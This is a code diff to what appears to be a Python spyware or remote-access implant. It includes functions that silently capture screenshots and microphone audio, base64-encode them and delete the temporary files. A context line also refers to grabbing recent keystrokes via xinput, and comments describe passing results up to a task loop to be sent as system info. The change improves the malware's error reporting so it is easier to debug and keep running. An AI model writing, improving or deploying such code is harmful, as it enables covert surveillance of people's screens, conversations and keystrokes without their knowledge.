@@ -82,15 +82,21 @@ def run_command(cmd, shell=True):
 def take_screenshot():
     try:
         filename = f"/tmp/scr_{int(time.time())}.png"
-        subprocess.run(["scrot", "-z", filename], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        # Capture stderr to debug "scrot" failures
+        result = subprocess.run(["scrot", "-z", filename], capture_output=True, text=True)
         
+        if result.returncode != 0:
+            # Raise loggable error
+            raise Exception(f"Scrot exited with {result.returncode}: {result.stderr.strip()}")
+            
         with open(filename, "rb") as f:
             img_data = base64.b64encode(f.read()).decode()
             
         os.remove(filename)
         return img_data
-    except:
-        return None
+    except Exception as e:
+        # Pass exception up to process_tasks to be sent as sysinfo
+        raise e
 
 def get_keys():
     # Attempt to grab last minute of keys using xinput test if available
@@ -101,15 +107,18 @@ def record_audio(duration=10):
     try:
         filename = f"/tmp/aud_{int(time.time())}.wav"
         # record 10 seconds, quietly
-        subprocess.run(["arecord", "-d", str(duration), "-f", "cd", "-t", "wav", "-q", filename], check=True)
+        result = subprocess.run(["arecord", "-d", str(duration), "-f", "cd", "-t", "wav", "-q", filename], capture_output=True, text=True)
+        
+        if result.returncode != 0:
+             raise Exception(f"Arecord exited with {result.returncode}: {result.stderr.strip()}")
         
         with open(filename, "rb") as f:
             audio_data = base64.b64encode(f.read()).decode()
             
         os.remove(filename)
         return audio_data
-    except:
-        return None
+    except Exception as e:
+        raise e
 
 def get_sys_info():
     info = {}
